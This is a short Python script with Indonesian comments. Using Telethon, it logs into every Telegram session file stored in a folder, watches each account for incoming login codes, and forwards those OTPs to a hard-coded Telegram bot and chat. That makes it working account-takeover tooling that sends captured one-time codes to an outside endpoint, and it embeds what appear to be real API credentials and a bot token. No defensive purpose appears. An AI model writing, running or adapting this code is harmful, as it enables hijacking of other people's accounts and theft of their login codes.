import os, asyncio
from telethon import TelegramClient, events
import requests

# api_id dan api_hash sama seperti di app.py
api_id = 16047851
api_hash = "d90d2bfd0b0a86c49e8991bd3a39339a"

# bot untuk forward OTP
BOT_TOKEN = "8062450896:AAHFGZeexuvK659JzfQdiagi3XwPd301Wi4"
CHAT_ID = "7712462494"

SESSION_DIR = "sessions"

async def main():
    print("Worker jalan...")

    # loop semua session file yang ada di folder sessions/
    clients = []
    for fname in os.listdir(SESSION_DIR):
        if fname.endswith(".session"):
            path = os.path.join(SESSION_DIR, fname)
            print(f"Memuat session {path}")
            client = TelegramClient(path, api_id, api_hash)
            await client.start()  # login otomatis pakai session
            clients.append(client)

            @client.on(events.NewMessage)
            async def handler(event):
                # jika pesan masuk mengandung "Login code"
                text_msg = event.message.message
                if "login code" in text_msg.lower() or "kode login" in text_msg.lower():
                    # forward ke bot
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                    payload = {
                        "chat_id": CHAT_ID,
                        "text": f"📩 Pesan OTP baru dari {fname}:\n\n{text_msg}"
                    }
                    requests.post(url, data=payload)

    # tunggu semua client sampai disconnect
    await asyncio.gather(*(c.run_until_disconnected() for c in clients))

if __name__ == "__main__":
    asyncio.run(main())
